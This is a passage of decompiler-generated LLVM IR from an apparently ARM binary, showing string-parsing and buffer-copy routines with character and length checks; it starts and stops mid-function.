  %v4_9860 = load i32, i32* %v11_82f4, align 4
  store i32 %v4_9860, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_989c

dec_label_pc_9868:                                ; preds = %bb194
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_986c = load i32, i32* %stack_var_-44, align 4
  %v0_9870 = load i32, i32* @r5, align 4
  %v2_9870 = add i32 %v0_9870, %v3_986c
  store i32 %v2_9870, i32* @r4, align 4
  store i32 %v2_9870, i32* %r0.global-to-local, align 4
  %v1_9878 = inttoptr i32 %v2_9870 to i8*
  %v2_9878 = call i32 @function_12324(i8* %v1_9878)
  store i32 ptrtoint ([5 x i8]* @global_var_197ac.44 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9878, i32* @r1, align 4
  %v0_9884 = load i32, i32* @r4, align 4
  store i32 %v0_9884, i32* %r0.global-to-local, align 4
  %v4_9888 = inttoptr i32 %v0_9884 to i8*
  %v5_9888 = call i32 @function_12680(i8* %v4_9888, i32 %v2_9878, i32 ptrtoint ([5 x i8]* @global_var_197ac.44 to i32))
  store i32 %v5_9888, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9890 = load i32, i32* %stack_var_-44, align 4
  %v2_9894 = add i32 %v3_9890, %v5_9888
  store i32 %v2_9894, i32* %ip.global-to-local, align 4
  store i32 %v2_9894, i32* %stack_var_-44, align 4
  br label %dec_label_pc_989c

dec_label_pc_989c:                                ; preds = %.thread35, %dec_label_pc_9868
  %v0_9d28 = phi i32 [ %v4_9860, %.thread35 ], [ %v2_9894, %dec_label_pc_9868 ]
  %v0_989c = load i32, i32* @r5, align 4
  %v2_989c = add i32 %v0_989c, %v0_9d28
  %v3_989c = inttoptr i32 %v2_989c to i8*
  %v4_989c = load i8, i8* %v3_989c, align 1
  %v6_989c = zext i8 %v4_989c to i32
  store i32 %v6_989c, i32* %r3.global-to-local, align 4
  %v2_98a0 = icmp ugt i8 %v4_989c, 33
  store i1 %v2_98a0, i1* %cpsr_c.global-to-local, align 1
  %v7_98a0 = icmp eq i8 %v4_989c, 34
  store i1 %v7_98a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_98a0, label %dec_label_pc_9d28, label %dec_label_pc_98a8

dec_label_pc_98a8:                                ; preds = %dec_label_pc_9d28, %dec_label_pc_989c, %dec_label_pc_9d50
  %v0_98a8 = load i32, i32* @r5, align 4
  store i32 %v0_98a8, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_98b0 = inttoptr i32 %v0_98a8 to i8*
  %v3_98b0 = call i32 @function_12448(i8* %v2_98b0, i32 10)
  store i32 %v3_98b0, i32* %r0.global-to-local, align 4
  %v1_98b4 = add i32 %v3_98b0, -1
  store i32 %v1_98b4, i32* %r3.global-to-local, align 4
  %v2_98b8 = icmp ugt i32 %v1_98b4, 7
  store i1 %v2_98b8, i1* %cpsr_c.global-to-local, align 1
  %v7_98b8 = icmp eq i32 %v1_98b4, 8
  store i1 %v7_98b8, i1* %cpsr_z.global-to-local, align 1
  %v2_98bc = xor i1 %v2_98b8, true
  %v3_98bc = or i1 %v7_98b8, %v2_98bc
  br i1 %v3_98bc, label %dec_label_pc_98d0.preheader, label %dec_label_pc_98e4

dec_label_pc_98d0.preheader:                      ; preds = %dec_label_pc_98a8
  store i32 %v2_8764, i32* %r3.global-to-local, align 4
  %v6_98c0 = add i32 %v3_98b0, %v2_8764
  store i32 %v6_98c0, i32* @r4, align 4
  br label %dec_label_pc_98d0

dec_label_pc_98cc:                                ; preds = %dec_label_pc_98d0
  %v1_98cc = call i32 @function_15c0c(i32 1)
  store i32 %v1_98cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98d0

dec_label_pc_98d0:                                ; preds = %dec_label_pc_98d0.preheader, %dec_label_pc_98cc
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_98d4 = call i32 @function_15ad0(i32* null)
  %v0_98d8 = load i32, i32* @r4, align 4
  %v3_98d8 = icmp uge i32 %v0_98d8, %v2_98d4
  store i1 %v3_98d8, i1* %cpsr_c.global-to-local, align 1
  %v9_98d8 = icmp eq i32 %v0_98d8, %v2_98d4
  store i1 %v9_98d8, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_98e0 = xor i1 %v9_98d8, true
  %v3_98e0 = and i1 %v3_98d8, %v2_98e0
  br i1 %v3_98e0, label %dec_label_pc_98cc, label %dec_label_pc_98e4

dec_label_pc_98e4:                                ; preds = %dec_label_pc_98d0, %dec_label_pc_98a8
  store i32 %v10_82f0, i32* @ip, align 4
  %v3_98e8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98e8, i32* @r4, align 4
  %v0_98ec = load i32, i32* @r5, align 4
  %v2_98ec = add i32 %v0_98ec, %v3_98e8
  store i32 %v2_98ec, i32* @r6, align 4
  store i32 %v2_98ec, i32* %r0.global-to-local, align 4
  %v1_98f4 = inttoptr i32 %v2_98ec to i8*
  %v2_98f4 = call i32 @function_12324(i8* %v1_98f4)
  store i32 ptrtoint ([5 x i8]* @global_var_197a4.42 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_98f4, i32* @r1, align 4
  %v0_9900 = load i32, i32* @r6, align 4
  store i32 %v0_9900, i32* %r0.global-to-local, align 4
  %v4_9904 = inttoptr i32 %v0_9900 to i8*
  %v5_9904 = call i32 @function_12680(i8* %v4_9904, i32 %v2_98f4, i32 ptrtoint ([5 x i8]* @global_var_197a4.42 to i32))
  store i32 %v5_9904, i32* %r0.global-to-local, align 4
  %v2_9908 = icmp ugt i32 %v5_9904, 3
  store i1 %v2_9908, i1* %cpsr_c.global-to-local, align 1
  %v7_9908 = icmp eq i32 %v5_9904, 4
  store i1 %v7_9908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9908, label %dec_label_pc_9c14, label %dec_label_pc_9910

dec_label_pc_9910:                                ; preds = %dec_label_pc_98e4
  %v0_9910 = load i32, i32* @r5, align 4
  %v1_9910 = load i32, i32* @r4, align 4
  %v2_9910 = add i32 %v1_9910, %v0_9910
  %v3_9910 = inttoptr i32 %v2_9910 to i8*
  %v4_9910 = load i8, i8* %v3_9910, align 1
  %v6_9910 = zext i8 %v4_9910 to i32
  store i32 %v6_9910, i32* @r3, align 4
  %v2_9914 = icmp ugt i8 %v4_9910, 46
  store i1 %v2_9914, i1* %cpsr_c.global-to-local, align 1
  %v7_9914 = icmp eq i8 %v4_9910, 47
  store i1 %v7_9914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9914, label %dec_label_pc_9d70, label %dec_label_pc_991c

dec_label_pc_991c:                                ; preds = %dec_label_pc_9d8c, %dec_label_pc_9d70, %dec_label_pc_9cd8, %dec_label_pc_9cbc, %dec_label_pc_9910, %dec_label_pc_9db8, %dec_label_pc_9d04
  %v0_991c = load i32, i32* @sb, align 4
  %v1_9920 = add i32 %v0_991c, 1431
  store i32 %v1_9920, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19780.19 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_992c = inttoptr i32 %v1_9920 to i16*
  %v5_992c = call i32 @function_150f0(i16* %v4_992c, i32 ptrtoint ([4 x i8]* @global_var_19780.19 to i32), i32 4)
  store i32 %v5_992c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_9934 = load i32, i32* @sl, align 4
  %v3_9934 = add i32 %v2_9934, -1448
  %v4_9934 = inttoptr i32 %v3_9934 to i8*
  store i8 10, i8* %v4_9934, align 1
  br label %dec_label_pc_87b4

dec_label_pc_993c:                                ; preds = %dec_label_pc_980c, %dec_label_pc_974c, %dec_label_pc_9720
  %v0_993c = load i32, i32* @fp, align 4
  store i32 %v0_993c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19798.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v5_994c = call i32 @function_123dc(i32 %v2_8278, i32 %v0_993c, i32 ptrtoint ([5 x i8]* @global_var_19798.40 to i32), i32 4)
  %v0_9950 = load i32, i32* @sb, align 4
  %v1_9954 = add i32 %v0_9950, 1431
  store i32 %v1_9954, i32* @r4, align 4
  store i32 %v5_994c, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_197b4.46 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_9954, i32* %r0.global-to-local, align 4
  %v3_9964 = inttoptr i32 %v1_9954 to i8*
  %v4_9964 = call i32 @function_12710(i8* %v3_9964, i32 ptrtoint ([5 x i8]* @global_var_197b4.46 to i32))
  store i32 %v4_9964, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9968 = icmp eq i32 %v4_9964, 0
  store i1 %v2_9968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9968, label %dec_label_pc_9b28, label %dec_label_pc_9970

dec_label_pc_9970:                                ; preds = %dec_label_pc_9b28, %dec_label_pc_993c
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_9974 = load i32, i32* @sl, align 4
  %v3_9974 = add i32 %v2_9974, -1448
  %v4_9974 = inttoptr i32 %v3_9974 to i8*
  store i8 7, i8* %v4_9974, align 1
  br label %dec_label_pc_9978

dec_label_pc_9978:                                ; preds = %bb200, %dec_label_pc_9970
  %v0_9978 = load i32, i32* @r5, align 4
  store i32 %v0_9978, i32* @r2, align 4
  %v0_997c = load i32, i32* @sl, align 4
  %v1_997c = add i32 %v0_997c, -1452
  %v2_997c = inttoptr i32 %v1_997c to i32*
  %v3_997c = load i32, i32* %v2_997c, align 4
  store i32 %v3_997c, i32* @r0, align 4
  store i32 %v2_8278, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_9988 = call i32 @function_14a08(i32 %v3_997c, i32 %v2_8278, i32 %v0_9978, i32 16384)
  store i32 %v4_9988, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_87b4

dec_label_pc_9990:                                ; preds = %dec_label_pc_8ce4
  %v0_9990 = call i32 @function_12ecc()
  store i32 %v0_9990, i32* %r0.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_9998 = inttoptr i32 %v0_9990 to i32*
  store i32 104, i32* %v2_9998, align 4
  br label %dec_label_pc_8d14

dec_label_pc_99a0:                                ; preds = %dec_label_pc_8ec0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v0_99a8 = load i32, i32* @sl, align 4
  %v1_99a8 = add i32 %v0_99a8, 660
  %v2_99a8 = inttoptr i32 %v1_99a8 to i32*
  %v3_99a8 = load i32, i32* %v2_99a8, align 4
  store i32 %v3_99a8, i32* @r4, align 4
  %v3_99ac = call i32 @function_119d0(i32 36, i32* null)
  %v0_99b0 = load i32, i32* @r4, align 4
  store i32 %v0_99b0, i32* %r1.global-to-local, align 4
  store i32 %v3_99ac, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_99bc = load i32, i32* @r7, align 4
  store i32 %v0_99bc, i32* %r0.global-to-local, align 4
  %v4_99c0 = call i32 @function_123dc(i32 %v0_99bc, i32 %v0_99b0, i32 %v3_99ac, i32 11)
  store i32 %v4_99c0, i32* %r0.global-to-local, align 4
  %v0_99c4 = load i32, i32* @sl, align 4
  %v1_99c4 = add i32 %v0_99c4, 660
  %v2_99c4 = inttoptr i32 %v1_99c4 to i32*
  %v3_99c4 = load i32, i32* %v2_99c4, align 4
  %v0_99c8 = load i32, i32* @r7, align 4
  %v2_99c8 = add i32 %v0_99c8, %v4_99c0
  store i32 %v2_99c8, i32* @r6, align 4
  store i32 %v4_99c0, i32* @r4, align 4
  %v2_99d0 = sub i32 %v3_99c4, %v4_99c0
  store i32 %v2_99d0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197bc.48 to i32), i32* %r2.global-to-local, align 4
  %v0_99d8 = load i32, i32* @r8, align 4
  store i32 %v0_99d8, i32* %r3.global-to-local, align 4
  store i32 %v2_99c8, i32* %r0.global-to-local, align 4
  %v4_99e0 = call i32 @function_123dc(i32 %v2_99c8, i32 %v2_99d0, i32 ptrtoint (i32* @global_var_197bc.48 to i32), i32 %v0_99d8)
  store i32 %v4_99e0, i32* %r0.global-to-local, align 4
  %v0_99e4 = load i32, i32* @sl, align 4
  %v1_99e4 = add i32 %v0_99e4, 16
  %v2_99e4 = inttoptr i32 %v1_99e4 to i32*
  %v3_99e4 = load i32, i32* %v2_99e4, align 4
  store i32 %v3_99e4, i32* %r3.global-to-local, align 4
  %v1_99e8 = load i32, i32* @r4, align 4
  %v2_99e8 = add i32 %v1_99e8, %v4_99e0
  store i32 %v2_99e8, i32* @r5, align 4
  %v0_99ec = load i32, i32* @sb, align 4
  %v2_99ec = add i32 %v0_99ec, %v2_99e8
  store i32 %v2_99ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* @fp, align 4
  %v2_99f4 = icmp ugt i32 %v3_99e4, 3
  store i1 %v2_99f4, i1* %cpsr_c.global-to-local, align 1
  %v7_99f4 = icmp eq i32 %v3_99e4, 4
  store i1 %v7_99f4, i1* %cpsr_z.global-to-local, align 1
  %v3_99f8 = add i32 %v2_99ec, 2115
  %v4_99f8 = inttoptr i32 %v3_99f8 to i8*
  store i8 0, i8* %v4_99f8, align 1
  %v7_99fc = icmp sgt i32 %v3_99e4, 4
  br i1 %v7_99fc, label %dec_label_pc_9a00, label %dec_label_pc_9b5c

dec_label_pc_9a00:                                ; preds = %dec_label_pc_99a0, %dec_label_pc_9b5c, %dec_label_pc_9b6c
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v1_9a08 = load i32, i32* @sl, align 4
  %v2_9a08 = add i32 %v1_9a08, 12
  %v3_9a08 = inttoptr i32 %v2_9a08 to i32*
  store i32 -1, i32* %v3_9a08, align 4
  %v0_9a0c = load i32, i32* %r2.global-to-local, align 4
  %v1_9a0c = trunc i32 %v0_9a0c to i8
  %v2_9a0c = load i32, i32* @sl, align 4
  %v3_9a0c = add i32 %v2_9a0c, -1448
  %v4_9a0c = inttoptr i32 %v3_9a0c to i8*
  store i8 %v1_9a0c, i8* %v4_9a0c, align 1
  br label %dec_label_pc_87b4

dec_label_pc_9a14:                                ; preds = %bb189
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_9a20 = load i32, i32* @r5, align 4
  %v1_9a20 = add i32 %v0_9a20, 4
  %v2_9a20 = inttoptr i32 %v1_9a20 to i8*
  %v3_9a20 = load i8, i8* %v2_9a20, align 1
  %v4_9a20 = zext i8 %v3_9a20 to i32
  store i32 %v4_9a20, i32* %r3.global-to-local, align 4
  %v2_9a24 = icmp ugt i8 %v3_9a20, 114
  store i1 %v2_9a24, i1* %cpsr_c.global-to-local, align 1
  %v7_9a24 = icmp eq i8 %v3_9a20, 115
  store i1 %v7_9a24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a24, label %bb195, label %.thread38

bb195:                                            ; preds = %dec_label_pc_9a14
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread38

.thread38:                                        ; preds = %dec_label_pc_9a14, %bb195
  %v3_9a34 = phi i32 [ 7, %dec_label_pc_9a14 ], [ 8, %bb195 ]
  store i32 %v0_9a20, i32* %r0.global-to-local, align 4
  %v1_9a3c = load i32, i32* @r6, align 4
  %v2_9a3c = sub i32 %v1_9a3c, %v3_9a34
  store i32 %v2_9a3c, i32* %r2.global-to-local, align 4
  %v2_9a40 = add i32 %v3_9a34, %v0_9a20
  store i32 %v2_9a40, i32* %r1.global-to-local, align 4
  %v3_9a44 = inttoptr i32 %v0_9a20 to i8*
  %v4_9a44 = call i32 @function_153fc(i8* %v3_9a44, i32 %v2_9a40, i32 %v2_9a3c)
  store i32 %v4_9a44, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v0_9a4c = load i32, i32* @r7, align 4
  store i32 %v0_9a4c, i32* %stack_var_-44, align 4
  store i32 %v2_8278, i32* %ip.global-to-local, align 4
  %v1_9a54 = load i32, i32* @r4, align 4
  %v2_9a54 = add i32 %v1_9a54, %v2_8278
  %v3_9a54 = inttoptr i32 %v2_9a54 to i8*
  %v4_9a54 = load i8, i8* %v3_9a54, align 1
  %v6_9a54 = zext i8 %v4_9a54 to i32
  store i32 %v6_9a54, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a58 = icmp eq i8 %v4_9a54, 0
  store i1 %v2_9a58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a58, label %dec_label_pc_9a9c, label %dec_label_pc_9a60

dec_label_pc_9a60:                                ; preds = %.thread38
  %v2_9a60 = icmp ugt i8 %v4_9a54, 46
  store i1 %v2_9a60, i1* %cpsr_c.global-to-local, align 1
  %v7_9a60 = icmp eq i8 %v4_9a54, 47
  store i1 %v7_9a60, i1* %cpsr_z.global-to-local, align 1
  %v1_9a64 = load i32, i32* @r5, align 4
  br i1 %v7_9a60, label %bb196, label %dec_label_pc_9a6c

bb196:                                            ; preds = %dec_label_pc_9a60
  store i32 %v1_9a64, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9c08

dec_label_pc_9a6c:                                ; preds = %dec_label_pc_9a60
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9a7c

dec_label_pc_9a74:                                ; preds = %dec_label_pc_9a7c
  %v2_9a74 = icmp ugt i8 %v4_9a88, 46
  store i1 %v2_9a74, i1* %cpsr_c.global-to-local, align 1
  %v7_9a74 = icmp eq i8 %v4_9a88, 47
  store i1 %v7_9a74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a74, label %dec_label_pc_9c08, label %dec_label_pc_9a7c

dec_label_pc_9a7c:                                ; preds = %dec_label_pc_9a74, %dec_label_pc_9a6c
  %v0_9a90 = phi i32 [ %v1_9a90, %dec_label_pc_9a74 ], [ 1, %dec_label_pc_9a6c ]
  store i32 %v0_9a90, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 %v0_9a90, i32* %stack_var_-44, align 4
  %v2_9a88 = add i32 %v0_9a90, %v1_9a64
  %v3_9a88 = inttoptr i32 %v2_9a88 to i8*
  %v4_9a88 = load i8, i8* %v3_9a88, align 1
  %v6_9a88 = zext i8 %v4_9a88 to i32
  store i32 %v6_9a88, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a8c = icmp eq i8 %v4_9a88, 0
  store i1 %v2_9a8c, i1* %cpsr_z.global-to-local, align 1
  %v1_9a90 = add i32 %v0_9a90, 1
  store i32 %v1_9a90, i32* %r2.global-to-local, align 4
  store i32 %v2_9a88, i32* %r1.global-to-local, align 4
  br i1 %v2_9a8c, label %dec_label_pc_9a9c, label %dec_label_pc_9a74

dec_label_pc_9a9c:                                ; preds = %dec_label_pc_9a7c, %.thread38, %dec_label_pc_9c08
  %v0_9a9c = load i32, i32* @r5, align 4
  store i32 %v0_9a9c, i32* %r0.global-to-local, align 4
  %v1_9aa0 = inttoptr i32 %v0_9a9c to i8*
  %v2_9aa0 = call i32 @function_12324(i8* %v1_9aa0)
  store i32 %v2_9aa0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9aa4 = icmp eq i32 %v2_9aa0, 0
  store i1 %v2_9aa4, i1* %cpsr_z.global-to-local, align 1
  %tmp197 = icmp slt i32 %v2_9aa0, 1
  br i1 %tmp197, label %dec_label_pc_9ac8, label %dec_label_pc_9aac

dec_label_pc_9aac:                                ; preds = %dec_label_pc_9a9c
  %v0_9aac = load i32, i32* @r5, align 4
  store i32 %v0_9aac, i32* %r0.global-to-local, align 4
  %v1_9ab0 = inttoptr i32 %v0_9aac to i8*
  %v2_9ab0 = call i32 @function_12324(i8* %v1_9ab0)
  store i32 %v2_9ab0, i32* %r0.global-to-local, align 4
  %v1_9ab4 = add i32 %v2_9ab0, -127
  %v2_9ab4 = icmp ugt i32 %v2_9ab0, 126
  store i1 %v2_9ab4, i1* %cpsr_c.global-to-local, align 1
  %v3_9ab4 = sub i32 126, %v2_9ab0
  %v4_9ab4 = and i32 %v3_9ab4, %v2_9ab0
  %v5_9ab4 = icmp slt i32 %v4_9ab4, 0
  %v6_9ab4 = icmp slt i32 %v1_9ab4, 0
  %v7_9ab4 = icmp eq i32 %v2_9ab0, 127
  store i1 %v7_9ab4, i1* %cpsr_z.global-to-local, align 1
  %v7_9ab8 = icmp sgt i32 %v2_9ab0, 127
  br i1 %v7_9ab8, label %.thread41, label %bb198

bb198:                                            ; preds = %dec_label_pc_9aac
  %v8_9ab8 = load i32, i32* @sb, align 4
  %v9_9abc = add i32 %v8_9ab8, 789
  store i32 %v9_9abc, i32* %r0.global-to-local, align 4
  %v8_9ac0 = load i32, i32* @r5, align 4
  store i32 %v8_9ac0, i32* %r1.global-to-local, align 4
  br label %.thread41

.thread41:                                        ; preds = %dec_label_pc_9aac, %bb198
  store i32 39624, i32* @lr, align 4
  %v3_9ac4 = xor i1 %v6_9ab4, %v5_9ab4
  %v4_9ac4 = or i1 %v7_9ab4, %v3_9ac4
  call void @__pseudo_cond_branch(i1 %v4_9ac4, i32 ptrtoint (i32* @global_var_1234c.49 to i32))
  br label %dec_label_pc_9ac8

dec_label_pc_9ac8:                                ; preds = %dec_label_pc_9a9c, %.thread41
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9acc = load i32, i32* %stack_var_-44, align 4
  %v0_9ad0 = load i32, i32* @r5, align 4
  %v1_9ad0 = add i32 %v0_9ad0, 1
  store i32 %v1_9ad0, i32* @r5, align 4
  %v2_9ad4 = add i32 %v1_9ad0, %v3_9acc
  store i32 %v2_9ad4, i32* %r0.global-to-local, align 4
  %v1_9ad8 = inttoptr i32 %v2_9ad4 to i8*
  %v2_9ad8 = call i32 @function_12324(i8* %v1_9ad8)
  store i32 %v2_9ad8, i32* %r0.global-to-local, align 4
  %v2_9adc = icmp ugt i32 %v2_9ad8, 254
  store i1 %v2_9adc, i1* %cpsr_c.global-to-local, align 1
  %v7_9adc = icmp eq i32 %v2_9ad8, 255
  store i1 %v7_9adc, i1* %cpsr_z.global-to-local, align 1
  %v8_9ae0 = icmp sgt i32 %v2_9ad8, 255
  br i1 %v8_9ae0, label %dec_label_pc_8d40, label %dec_label_pc_9ae4

dec_label_pc_9ae4:                                ; preds = %dec_label_pc_9ac8
  %v0_9ae4 = load i32, i32* @sb, align 4
  %v1_9ae8 = add i32 %v0_9ae4, 533
  store i32 %v1_9ae8, i32* @r4, align 4
  store i32 %v1_9ae8, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9af4 = call i32 @function_123b8(i32 %v1_9ae8, i32 255)
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9afc = load i32, i32* %stack_var_-44, align 4
  %v0_9b00 = load i32, i32* @r5, align 4
  %v2_9b00 = add i32 %v0_9b00, %v3_9afc
  store i32 %v2_9b00, i32* %r0.global-to-local, align 4
  %v1_9b04 = inttoptr i32 %v2_9b00 to i8*
  %v2_9b04 = call i32 @function_12324(i8* %v1_9b04)
  store i32 %v2_9b04, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9b08 = icmp eq i32 %v2_9b04, 0
  store i1 %v2_9b08, i1* %cpsr_z.global-to-local, align 1
  %tmp199 = icmp slt i32 %v2_9b04, 1
  br i1 %tmp199, label %dec_label_pc_8d40, label %dec_label_pc_9b10

dec_label_pc_9b10:                                ; preds = %dec_label_pc_9ae4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9b14 = load i32, i32* %stack_var_-44, align 4
  %v0_9b18 = load i32, i32* @r4, align 4
  store i32 %v0_9b18, i32* @r0, align 4
  %v0_9b1c = load i32, i32* @r5, align 4
  %v2_9b1c = add i32 %v0_9b1c, %v3_9b14
  store i32 %v2_9b1c, i32* %r1.global-to-local, align 4
  %v2_9b20 = inttoptr i32 %v0_9b18 to i8*
  %v3_9b20 = call i32 @function_1234c(i8* %v2_9b20, i32 %v2_9b1c)
  store i32 %v3_9b20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8d40

dec_label_pc_9b28:                                ; preds = %dec_label_pc_993c
  %v0_9b28 = load i32, i32* @r4, align 4
  store i32 %v0_9b28, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19780.19 to i32), i32* %r1.global-to-local, align 4
  %v3_9b30 = inttoptr i32 %v0_9b28 to i8*
  %v4_9b30 = call i32 @function_12710(i8* %v3_9b30, i32 ptrtoint ([4 x i8]* @global_var_19780.19 to i32))
  store i32 %v4_9b30, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9b34 = icmp eq i32 %v4_9b30, 0
  store i1 %v2_9b34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9b34, label %bb200, label %dec_label_pc_9970

bb200:                                            ; preds = %dec_label_pc_9b28
  %v0_9b3c = load i32, i32* @fp, align 4
  %v1_9b3c = load i32, i32* @r5, align 4
  %v3_9b3c = icmp uge i32 %v0_9b3c, %v1_9b3c
  store i1 %v3_9b3c, i1* %cpsr_c.global-to-local, align 1
  %v9_9b3c = icmp eq i32 %v0_9b3c, %v1_9b3c
  store i1 %v9_9b3c, i1* %cpsr_z.global-to-local, align 1
  %v7_9b40 = icmp sgt i32 %v0_9b3c, %v1_9b3c
  %. = select i1 %v7_9b40, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_9b48 = trunc i32 %. to i8
  %v10_9b48 = load i32, i32* @sl, align 4
  %v11_9b48 = add i32 %v10_9b48, -1448
  %v12_9b48 = inttoptr i32 %v11_9b48 to i8*
  store i8 %v9_9b48, i8* %v12_9b48, align 1
  br label %dec_label_pc_9978

dec_label_pc_9b54:                                ; preds = %dec_label_pc_8f64
  %v0_9b54 = load i32, i32* @r4, align 4
  %v1_9b54 = trunc i32 %v0_9b54 to i8
  %v2_9b54 = load i32, i32* @sl, align 4
  %v3_9b54 = add i32 %v2_9b54, -1448
  %v4_9b54 = inttoptr i32 %v3_9b54 to i8*
  store i8 %v1_9b54, i8* %v4_9b54, align 1
  br label %dec_label_pc_87b4

dec_label_pc_9b5c:                                ; preds = %dec_label_pc_99a0
  %v0_9b5c = load i32, i32* @r6, align 4
  store i32 %v0_9b5c, i32* %r0.global-to-local, align 4
  %v1_9b60 = inttoptr i32 %v0_9b5c to i8*
  %v2_9b60 = call i32 @function_12324(i8* %v1_9b60)
  store i32 %v2_9b60, i32* %r0.global-to-local, align 4
  %v2_9b64 = icmp ugt i32 %v2_9b60, 126
  store i1 %v2_9b64, i1* %cpsr_c.global-to-local, align 1
  %v7_9b64 = icmp eq i32 %v2_9b60, 127
  store i1 %v7_9b64, i1* %cpsr_z.global-to-local, align 1
  %v8_9b68 = icmp sgt i32 %v2_9b60, 127
  br i1 %v8_9b68, label %dec_label_pc_9a00, label %dec_label_pc_9b6c

dec_label_pc_9b6c:                                ; preds = %dec_label_pc_9b5c
  %v0_9b6c = load i32, i32* @sl, align 4
  %v1_9b6c = add i32 %v0_9b6c, 16
  %v2_9b6c = inttoptr i32 %v1_9b6c to i32*
  %v3_9b6c = load i32, i32* %v2_9b6c, align 4
  %v1_9b70 = and i32 %v3_9b6c, 33554432
  %v2_9b70 = icmp ne i32 %v1_9b70, 0
  store i1 %v2_9b70, i1* %cpsr_c.global-to-local, align 1
  %v3_9b70 = mul i32 %v3_9b6c, 128
  %v1_9b74 = add i32 %v3_9b70, 1472
  %v0_9b78 = load i32, i32* @r6, align 4
  store i32 %v0_9b78, i32* %r1.global-to-local, align 4
  %v0_9b7c = load i32, i32* @sb, align 4
  %v2_9b7c = add i32 %v1_9b74, %v0_9b7c
  store i32 %v2_9b7c, i32* @r0, align 4
  %v2_9b80 = inttoptr i32 %v2_9b7c to i8*
  %v3_9b80 = call i32 @function_1234c(i8* %v2_9b80, i32 %v0_9b78)
  store i32 %v3_9b80, i32* %r0.global-to-local, align 4
  %v0_9b84 = load i32, i32* @sl, align 4
  %v1_9b84 = add i32 %v0_9b84, 16
  %v2_9b84 = inttoptr i32 %v1_9b84 to i32*
  %v3_9b84 = load i32, i32* %v2_9b84, align 4
  %v1_9b88 = and i32 %v3_9b84, 33554432
  %v2_9b88 = icmp ne i32 %v1_9b88, 0
  store i1 %v2_9b88, i1* %cpsr_c.global-to-local, align 1
  %v3_9b88 = mul i32 %v3_9b84, 128
  %v1_9b8c = add i32 %v3_9b88, 1472
  %v0_9b90 = load i32, i32* @sb, align 4
  %v2_9b90 = add i32 %v1_9b8c, %v0_9b90
  store i32 %v2_9b90, i32* @r4, align 4
  store i32 %v2_9b90, i32* %r0.global-to-local, align 4
  %v1_9b98 = inttoptr i32 %v2_9b90 to i8*
  %v2_9b98 = call i32 @function_12324(i8* %v1_9b98)
  store i32 ptrtoint (i32* @global_var_197c0.51 to i32), i32* %r1.global-to-local, align 4
  %v0_9ba0 = load i32, i32* @r4, align 4
  %v2_9ba0 = add i32 %v0_9ba0, %v2_9b98
  store i32 %v2_9ba0, i32* @r0, align 4
